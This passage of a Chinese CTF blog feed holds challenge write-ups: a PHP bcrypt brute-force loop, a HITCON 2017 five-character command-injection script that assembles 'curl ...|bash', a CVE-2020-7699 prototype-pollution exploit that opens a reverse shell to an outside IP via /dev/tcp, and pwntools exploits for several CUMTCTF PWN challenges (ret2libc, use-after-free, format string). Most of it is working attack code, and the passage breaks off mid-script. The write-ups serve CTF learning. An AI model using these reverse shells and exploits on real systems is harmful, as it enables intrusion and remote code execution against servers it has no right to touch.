class="line">$key = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>; </span><br><span class="line">$bcrypt = <span class="keyword">new</span> Bcrypt(); </span><br><span class="line">$plaintext = <span class="string">'bcrypt'</span>;<span class="comment">//bcryptyyds </span></span><br><span class="line">$ciphertext = <span class="string">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">26</span>;$i++) &#123; </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">26</span>;$j++) &#123; </span><br><span class="line">        <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;<span class="number">26</span>;$k++) &#123; </span><br><span class="line">            <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;<span class="number">26</span>;$m++) &#123; </span><br><span class="line">                <span class="keyword">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class="line">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class="line">                <span class="keyword">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"&lt;/br&gt;Password verified!&lt;/br&gt;"</span>); </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"Wow!!Now,hack it!&lt;/br&gt;"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>最终的考点就是命令执行可以参考hitcon-ctf-2017</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">mkdir($path);</span><br><span class="line">chdir($path);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题大概意思就是存在命令执行，但单次输入字符不得大于5。因此利用linux下特有的命令来写入shell反弹。原理就是利用curl ip|bash等很多方式去反弹shell。顺便也复习了反弹shell的一些基本操作</p><p>官方的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">url = <span class="string">"http://219.219.61.234:10048/?cmd="</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g" '</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate "curl 0X2761697D|bash"</span></span><br><span class="line">    <span class="string">'&gt;sh '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7D\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\'</span>,</span><br><span class="line">    <span class="string">'&gt;61\\'</span>,</span><br><span class="line">    <span class="string">'&gt;27\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0X\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    data = &#123; <span class="string">'passwd'</span>:<span class="string">'bcryptyyds'</span>, &#125;</span><br><span class="line">    header = &#123; <span class="string">"Content-Type"</span> : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">               <span class="string">"Accept"</span> : <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">               <span class="string">"Upgrade-Insecure-Requests"</span> : <span class="string">"1"</span> &#125;</span><br><span class="line">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>这个很郁闷，配置环境很长时间还是没能弄出来</p><h2 id="EZnode"><a href="#EZnode" class="headerlink" title="EZnode"></a>EZnode</h2><p>应该是国赛分区赛的题</p><h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><p>nginx反向代理配置错误</p><p>首先来学习一下ngnix</p><h3 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h3><p>ngnix是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器。</p><p>主要在三个方面</p><ul><li>反向代理</li><li>负载均衡</li><li>nginx特点</li></ul><p><strong>反向代理</strong></p><blockquote><p>先说正向代理</p><p>客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。</p></blockquote><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p><p>上面这个图就很形象了</p><p>多个客户端给服务器发送的请求，nginx服务器接收到之后，</p><p>按照一定的规则分发给了后端的业务处理服务器进行处理了。</p><p>此时~请求的来源也就是客户端是明确的，但是请求具体由哪台服务器处理的并不明确了，nginx扮演的就是一个反向代理角色</p><p><strong>负载均衡</strong></p><p>在反向代理中</p><p>客户端会向服务端发出请求，而服务器将接受到的请求按照规则分发的过程，就叫做负载均衡</p><p><strong>ngnix配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">main                                # 全局配置</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginx工作模式配置</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # http设置</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # 服务器主机配置</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # 路由配置</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # 负载均衡配置</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有目录穿越漏洞参考</p><p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p><p>/static../</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p><p>之后就是找cve了，比较菜，只能学习</p><p>cve-2020-7699</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure><p>之后反弹shell，执行命令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Hitcon2017-babyfirst-reveng&quot;&gt;&lt;a href=&quot;#Hitcon2017-babyfirst-reveng&quot; class=&quot;headerlink&quot; title=&quot;Hitcon2017 babyfirst</summary>
      
    
    
    
    <category term="CTF" scheme="https://pz1o.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2020-12-16T05:57:02.940Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020岁末赛</title>
    <link href="https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/</id>
    <published>2020-12-26T14:32:03.000Z</published>
    <updated>2020-12-28T02:24:43.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUMTCTF2020岁末赛"><a href="#CUMTCTF2020岁末赛" class="headerlink" title="CUMTCTF2020岁末赛"></a>CUMTCTF2020岁末赛</h1><p>学长们可太搞了，比赛最后垂直上分可太秀了</p><p><img src="/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png" alt="image-20201226220723157"></p><p>只放PWN的题解了</p><p>下面几个题先放题解，等期末考完试来复现</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><p>\x00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"\x00"</span>*<span class="number">7</span> + p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>在1的基础上puts泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn2")</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context(arch="i386",os="linux")</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x80486D3</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">print(r.recv())</span><br><span class="line">put = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(hex(put))</span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',put)</span></span><br><span class="line"></span><br><span class="line">libcbase = put - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">sh = libcbase + binsh</span><br><span class="line">payload1 = <span class="string">b'\x00'</span>*<span class="number">7</span> + <span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">payload3 = <span class="string">b"A"</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h2><p>UAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("219.219.61.234",10002)</span></span><br><span class="line">r = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"AAAA"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"BBBB"</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(magic))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN4-fail"><a href="#PWN4-fail" class="headerlink" title="PWN4(fail)"></a>PWN4(fail)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn4'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10003'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">key = <span class="string">'3xpL0r3R'</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(str(key))</span><br><span class="line">payload = <span class="string">'aaaa%77$p'</span><span class="comment">#6</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaa0x'</span>)</span><br><span class="line">libc_base = int(int(sh.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20840</span>)</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line">gad_get = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one_addr = libc_base + gad_get[<span class="number">0</span>]</span><br><span class="line">log.success(hex(one_addr))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN5-fail"><a href="#PWN5-fail" class="headerlink" title="PWN5(fail)"></a>PWN5(fail)</h2><p>淦 这个题我以为给的libc就能用 没想到用的是本机的libc简直血亏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 